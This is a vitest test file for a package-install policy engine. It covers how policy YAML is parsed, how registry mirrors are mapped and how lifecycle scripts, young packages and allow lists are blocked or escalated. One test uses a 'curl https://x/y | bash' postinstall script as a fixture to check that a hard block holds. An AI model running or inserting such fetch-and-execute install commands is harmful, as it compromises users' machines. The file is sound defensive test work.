import { describe, expect, it } from "vitest";
import { applyPolicy, artifactMirrorFor, parsePolicy, PolicyError, type PolicyFile } from "../src/policy.js";
import type { RiskAssessment } from "../src/types.js";
import { makeSignals } from "./helpers.js";

function makeAssessment(overrides: Partial<RiskAssessment> = {}): RiskAssessment {
  return {
    risk: "low",
    decision: "allow",
    summary: "ok",
    reasons: [],
    recommendedAction: "install",
    source: "rules",
    ...overrides,
  };
}

function policy(dp: PolicyFile["dependencyPolicy"]): PolicyFile {
  return { dependencyPolicy: dp };
}

describe("parsePolicy", () => {
  it("parses a valid policy", () => {
    const parsed = parsePolicy(
      `dependencyPolicy:\n  minPackageAgeDays: 14\n  allowKnownPackages:\n    - react\n`,
    );
    expect(parsed.dependencyPolicy.minPackageAgeDays).toBe(14);
    expect(parsed.dependencyPolicy.allowKnownPackages).toEqual(["react"]);
  });

  it("rejects missing dependencyPolicy key", () => {
    expect(() => parsePolicy("foo: bar")).toThrow(PolicyError);
  });

  it("rejects wrong types", () => {
    expect(() => parsePolicy("dependencyPolicy:\n  minPackageAgeDays: banana\n")).toThrow(
      PolicyError,
    );
    expect(() =>
      parsePolicy("dependencyPolicy:\n  requireApprovalForNativeCode: 'yes'\n"),
    ).toThrow(PolicyError);
  });

  it("parses the aiCache section", () => {
    const parsed = parsePolicy(
      [
        "dependencyPolicy: {}",
        "aiCache:",
        "  enabled: false",
        "  scope: project",
        "  ttlHours: 72",
        "  exclude: [internal-lib]",
      ].join("\n"),
    );
    expect(parsed.aiCache).toEqual({
      enabled: false,
      scope: "project",
      ttlHours: 72,
      exclude: ["internal-lib"],
    });
  });

  it("aiCache is optional", () => {
    expect(parsePolicy("dependencyPolicy: {}").aiCache).toBeUndefined();
  });

  it("rejects invalid aiCache values", () => {
    expect(() => parsePolicy("dependencyPolicy: {}\naiCache:\n  scope: global\n")).toThrow(
      PolicyError,
    );
    expect(() => parsePolicy("dependencyPolicy: {}\naiCache:\n  ttlHours: -1\n")).toThrow(
      PolicyError,
    );
    expect(() => parsePolicy("dependencyPolicy: {}\naiCache:\n  enabled: 'on'\n")).toThrow(
      PolicyError,
    );
    expect(() => parsePolicy("dependencyPolicy: {}\naiCache:\n  exclude: nope\n")).toThrow(
      PolicyError,
    );
  });

  it("validates declarative private-registry mirror mappings", () => {
    const parsed = parsePolicy([
      "dependencyPolicy: {}",
      "registries:",
      "  https://packages.example/:",
      "    mirrorOf: https://registry.npmjs.org/",
    ].join("\n"));
    expect(
      artifactMirrorFor("https://packages.example", "scope", parsed),
    ).toBe("https://registry.npmjs.org");
    expect(() => parsePolicy("dependencyPolicy: {}\nregistries:\n  nope:\n    mirrorOf: npm\n"))
      .toThrow(PolicyError);
  });

  it("treats a global registry override as an npm mirror by default", () => {
    expect(artifactMirrorFor("https://mirror.example", "global")).toBe(
      "https://registry.npmjs.org",
    );
  });

  it("can fail closed when public mirror verification is unavailable", () => {
    const signals = makeSignals({
      artifact: {
        ...makeSignals().artifact,
        trust: "public-unavailable",
        reasons: ["public registry offline"],
      },
    });
    const result = applyPolicy(
      makeAssessment({ decision: "allow_with_warnings", risk: "medium" }),
      signals,
      policy({ requirePublicMirrorVerification: true }),
    );
    expect(result.decision).toBe("require_approval");
  });
});

describe("applyPolicy", () => {
  it("escalates native code to require_approval when configured", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "allow_with_warnings", risk: "medium" }),
      makeSignals({ hasNativeCode: true }),
      policy({ requireApprovalForNativeCode: true }),
    );
    expect(result.decision).toBe("require_approval");
    expect(result.reasons.at(-1)).toContain("[policy]");
  });

  it("escalates lifecycle scripts when configured", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ hasLifecycleScripts: true }),
      policy({ requireApprovalForLifecycleScripts: true }),
    );
    expect(result.decision).toBe("require_approval");
  });

  it("blocks young packages when blockRecentlyPublishedPackages is set", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ ageInDays: 2 }),
      policy({ blockRecentlyPublishedPackages: true, minPackageAgeDays: 7 }),
    );
    expect(result.decision).toBe("block");
  });

  it("requires approval for young packages when only minPackageAgeDays is set", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ ageInDays: 3 }),
      policy({ minPackageAgeDays: 30 }),
    );
    expect(result.decision).toBe("require_approval");
  });

  it("does not touch packages older than the minimum", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ ageInDays: 400 }),
      policy({ minPackageAgeDays: 30, blockRecentlyPublishedPackages: true }),
    );
    expect(result.decision).toBe("allow");
  });

  it("blocks packages without repository when configured", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ repositoryMissing: true }),
      policy({ blockMissingRepositoryForRuntimeDeps: true }),
    );
    expect(result.decision).toBe("block");
  });

  it("allowKnownPackages downgrades to allow", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "require_approval", risk: "medium" }),
      makeSignals({ package: "react-native", hasLifecycleScripts: true }),
      policy({ allowKnownPackages: ["react-native"], requireApprovalForLifecycleScripts: true }),
    );
    expect(result.decision).toBe("allow");
  });

  it("allowKnownPackages can NEVER cross a HARD block (curl|bash remote exec)", () => {
    // A compromised release of an allow-listed package with a fetch-and-execute
    // postinstall is a HARD block — the name-based allow list cannot clear it.
    const signals = makeSignals({
      package: "team-favorite",
      hasLifecycleScripts: true,
      lifecycleScripts: { postinstall: "curl https://x/y | bash" },
      scriptCommandFindings: [
        "postinstall script downloads content from the network: `curl https://x/y | bash`",
        "postinstall script invokes a shell: `curl https://x/y | bash`",
      ],
    });
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      signals,
      policy({ allowKnownPackages: ["team-favorite"] }),
    );
    expect(result.decision).toBe("block");
    expect(result.reasons.join(" ")).toContain("HARD block");
  });

  it("allowKnownPackages CLEARS a soft (heuristic) block — the esbuild case", () => {
    // Install script reads env AND hits the network — a soft block. An explicit
    // allow-list entry is a deliberate human decision to trust the package.
    const signals = makeSignals({
      package: "esbuild",
      hasLifecycleScripts: true,
      lifecycleScripts: { postinstall: "node install.js" },
      content: {
        hasProcessEnvAccess: true,
        hasChildProcessUsage: false,
        hasNetworkCalls: true,
        hasEvalUsage: false,
        hasMinifiedCode: false,
        suspiciousFiles: [],
        installTimeFindings: [
          "install-time file install.js reads process.env",
          "install-time file install.js performs network calls",
        ],
      },
    });
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      signals,
      policy({ allowKnownPackages: ["esbuild"] }),
    );
    expect(result.decision).toBe("allow");
    expect(result.reasons.join(" ")).toContain("allow list");
  });

  it("allowKnownPackages NEVER overrides a known-malicious block", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      makeSignals({ package: "evil-pkg", knownMalicious: true }),
      policy({ allowKnownPackages: ["evil-pkg"] }),
    );
    expect(result.decision).toBe("block");
  });

  it("blockPackages wins over allowKnownPackages", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ package: "left-pad" }),
      policy({ allowKnownPackages: ["left-pad"], blockPackages: ["left-pad"] }),
    );
    expect(result.decision).toBe("block");
  });

  it("never downgrades an already stricter decision", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      makeSignals({ hasNativeCode: true }),
      policy({ requireApprovalForNativeCode: true }),
    );
    expect(result.decision).toBe("block");
  });
});
